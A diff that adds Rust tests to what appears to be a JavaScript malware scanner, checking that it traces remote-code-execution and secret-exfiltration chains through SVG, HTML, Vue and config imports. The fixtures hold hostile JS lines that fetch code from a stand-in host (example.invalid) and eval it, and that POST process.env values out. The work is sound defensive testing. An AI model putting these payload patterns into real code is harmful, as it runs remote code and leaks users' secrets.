@@ -102,6 +102,50 @@ fn build_config_import_elevates_fake_asset_with_process_execution() {
 }
 
 #[test]
+fn imported_svg_script_reaches_remote_execution() {
+    let root = temporary_directory("svg-script-chain");
+    fs::write(
+        root.join("tailwind.config.js"),
+        b"require('./payload.svg');",
+    )
+    .unwrap();
+    fs::write(
+        root.join("payload.svg"),
+        b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>const payload = fetch('https://example.invalid/control'); eval(payload);</script></svg>",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                    && finding["file"] == "payload.svg"
+                    && finding["evidence"]
+                        .to_string()
+                        .contains("tailwind.config.js")
+            })
+    );
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
+                    && finding["file"] == "payload.svg"
+                    && finding["severity"] == "critical"
+            })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn reconstructed_polinrider_woff2_trait_is_elevated_by_build_config() {
     let root = temporary_directory("woff-loader");
     fs::write(
@@ -587,6 +631,126 @@ fn cross_file_response_decode_reaches_computed_function() {
 }
 
 #[test]
+fn html_inline_and_external_scripts_enter_the_execution_graph() {
+    let root = temporary_directory("html-scripts");
+    fs::write(
+        root.join("index.html"),
+        b"<!doctype html>\n<script type=\"module\">\nconst payload = fetch('https://example.invalid/control');\neval(payload);\n</script>\n<script src=\"./external.js\"></script>",
+    )
+    .unwrap();
+    fs::write(
+        root.join("external.js"),
+        b"const payload = fetch('https://example.invalid/control'); eval(payload);",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let chains: Vec<_> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect();
+    assert_eq!(chains.len(), 2);
+    for chain in &chains {
+        assert_eq!(chain["severity"], "critical");
+    }
+    assert!(chains.iter().any(|chain| {
+        chain["file"] == "index.html"
+            && chain["line"] == 4
+            && chain["evidence"]
+                .to_string()
+                .contains("inline script in HTML")
+    }));
+    assert!(chains.iter().any(|chain| {
+        chain["file"] == "external.js"
+            && chain["evidence"].to_string().contains("index.html")
+            && chain["evidence"]
+                .to_string()
+                .contains("inline script in HTML")
+    }));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn reachable_vue_typescript_is_traced_but_markdown_examples_are_not() {
+    let root = temporary_directory("vue-markdown-scripts");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(root.join("main.js"), b"import './App.vue';").unwrap();
+    fs::write(
+        root.join("App.vue"),
+        b"<template />\n<script>const helper = 1;</script>\n<script setup lang=\"ts\">\nconst payload: string = fetch('https://example.invalid/control');\neval(payload);\n</script>",
+    )
+    .unwrap();
+    fs::write(
+        root.join("README.md"),
+        b"```html\n<script>const payload = fetch('https://example.invalid/example'); eval(payload);</script>\n```\n",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let chains: Vec<_> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect();
+    assert_eq!(chains.len(), 1);
+    assert_eq!(chains[0]["file"], "App.vue");
+    assert_eq!(chains[0]["line"], 5);
+    assert!(chains[0]["evidence"].to_string().contains("npm start"));
+    assert_eq!(report["status"], "complete");
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn embedded_script_parse_and_count_limits_make_the_scan_incomplete() {
+    let malformed_root = temporary_directory("malformed-embedded-script");
+    fs::write(
+        malformed_root.join("index.html"),
+        b"<script>const = ;</script>",
+    )
+    .unwrap();
+
+    let output = run(&[malformed_root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(2));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "incomplete");
+    assert!(
+        report["incomplete_reasons"]
+            .to_string()
+            .contains("index.html")
+    );
+    fs::remove_dir_all(malformed_root).unwrap();
+
+    let limited_root = temporary_directory("embedded-script-limit");
+    let scripts = "<script>const value = 1;</script>".repeat(257);
+    fs::write(limited_root.join("index.html"), scripts).unwrap();
+
+    let output = run(&[limited_root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(2));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "incomplete");
+    assert!(
+        report["incomplete_reasons"]
+            .to_string()
+            .contains("embedded script limit")
+    );
+    fs::remove_dir_all(limited_root).unwrap();
+}
+
+#[test]
 fn remote_data_survives_a_simple_character_xor_decoder() {
     let root = temporary_directory("xor-decoder");
     fs::write(
@@ -605,6 +769,63 @@ fn remote_data_survives_a_simple_character_xor_decoder() {
             .iter()
             .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                 && finding["evidence"].to_string().contains("decode"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn taint_survives_iterable_remote_responses_and_dynamic_environment_keys() {
+    let root = temporary_directory("loop-taint");
+    fs::write(
+        root.join("main.js"),
+        b"async function boot() { const response = await fetch('https://example.invalid/control'); for (const line of (await response.text()).split('\\n')) { eval(line); } } boot();\nconst key = 'TOKEN'; fetch('https://example.invalid/collect', { method: 'POST', body: process.env[key] });\nfor (const [name, value] of Object.entries(process.env)) { fetch('https://example.invalid/env', { body: value }); }\nfetch('https://example.invalid/names', { body: Object.keys(process.env) });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = report["findings"].as_array().unwrap();
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+    );
+    assert!(findings.iter().any(|finding| {
+        finding["id"] == "JS-SECRET-EXFILTRATION"
+            && finding["evidence"].to_string().contains("process.env")
+    }));
+    assert_eq!(
+        findings
+            .iter()
+            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+            .count(),
+        2,
+        "environment variable names alone are not secret values"
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn taint_reaches_sinks_inside_classic_for_and_switch_branches() {
+    let root = temporary_directory("loop-switch-taint");
+    fs::write(
+        root.join("main.js"),
+        b"for (let payload = fetch('https://example.invalid/for'); payload; payload = null) {\n  eval(payload);\n}\nconst second = fetch('https://example.invalid/switch');\nswitch (process.platform) {\n  case 'win32': Function(second)(); break;\n  default: break;\n}",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+            .count()
+            >= 2
     );
     fs::remove_dir_all(root).unwrap();
 }
